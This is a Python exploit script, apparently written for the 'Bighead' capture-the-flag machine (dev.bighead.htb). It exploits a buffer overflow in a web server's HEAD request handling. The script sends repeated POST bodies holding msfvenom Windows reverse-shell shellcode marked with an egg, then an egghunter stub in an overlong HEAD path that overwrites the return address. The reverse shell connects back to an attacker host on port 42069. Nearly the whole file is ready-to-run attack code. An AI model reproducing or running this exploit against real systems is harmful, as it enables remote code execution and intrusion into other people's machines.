#!/usr/bin/python
import socket
import binascii
import re

host = '10.129.229.241' # IP of the target
port = 80 # Port open on the target
egg = 'valo' # string used as the 'egg'

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=42069 -b '\x00' -f python
buf =  ''
buf += 'be62962325dbc3d97424f45f2b'
buf += 'c9b15283c70431770e031598c1'
buf += 'd0254c871bd58de89230bc28c0'
buf += '31ef9882171c52c6839716cfa4'
buf += '109c298ba18d0a8a21cc5e6c1b'
buf += '1f936d5c425e3f3508cdaf3244'
buf += 'ce44084856b9d96b776c513257'
buf += '8fb64ede97db6ba82c2f072be4'
buf += '61e880c94d1bd80e69c4af6689'
buf += '79a8bdf3a53d25532de58165e2'
buf += '7042694ff60c6e4edb278adbda'
buf += 'e71a9ff823467b6072222a9d64'
buf += '8d933bef20c731b22c24784cad'
buf += '220b3f9feda7d793666e20d35c'
buf += 'd6be2a5f2797e80b778fd9331c'
buf += '4fe5e1b31f495a74cf290a1c05'
buf += 'a6753c266c1ed7dde72b22d3f9'
buf += '4330eba1c1bd0dc3f9eb867c63'
buf += 'b65c1c6c6c191ee683ded10fe9'
buf += 'cc86ffa4ae01ff12c6ce92f816'
buf += '988e5641cd61af07e3d81935fe'
buf += 'bd62fd257e6cfca83a4aee74c2'
buf += 'd65a299580348f4f63ee59232d'
buf += '661f0feef0205a981c9033dd23'
buf += '1dd4e95c434415b7c7745c956e'
buf += '1d394c3340babb707d3949097a'
buf += '21380cc6e5d17c5780d5d35881'

# Put the egg before the shellcode so that the gunter can find it.
shellcode = (egg * 2) + binascii.unhexlify(buf)

# Generated from !mona egg -t valo
egghunter = '6681caff0f42526a0258cd2e3c055a74efb8' + binascii.hexlify(egg) + '8bfaaf75eaaf75e7ffe7'

# Send the shell code many times so that the gunter has a better chance of finding it
def send_shellcode(host,port,egg,shellcode):
        print ('[*] Sending Shellcode')
        for i in range(0,4):
                thighhigh = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
                thighhigh.connect((host,port))
                thighhigh.send('POST / HTTP/1.1\r\n')
                thighhigh.send('Host: dev.bighead.htb\r\n')
                thighhigh.send('Content-Length: %s\r\n'%len(shellcode))
                thighhigh.send('\r\n')
                thighhigh.send(shellcode+'\r\n')
                thighhigh.send('\r\n')
                print ('[' + str(i) + '] ' + re.sub(r'\s',' ',thighhigh.recv(12)))
                thighhigh.close()
        print ('[*] Done')

# Send the gunter
def send_egghunter(host,port,egghunter):
        print ('[*] Sending EggHunter')
        thighhigh = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
        thighhigh.connect((host,port))
        thighhigh.settimeout(None)
        thighhigh.send('HEAD /' + ('V'*72) + 'f0125062' + egghunter + ' HTTP/1.1\r\n')
        thighhigh.send('Host: dev.bighead.htb\r\n')
        thighhigh.send('\r\n')
        print ('\033[34m' + re.sub(r'\s',' ',thighhigh.recv(12)))
        thighhigh.close()
        print ('[*] Done')

send_shellcode(host,port,egg,shellcode)
send_egghunter(host,port,egghunter)
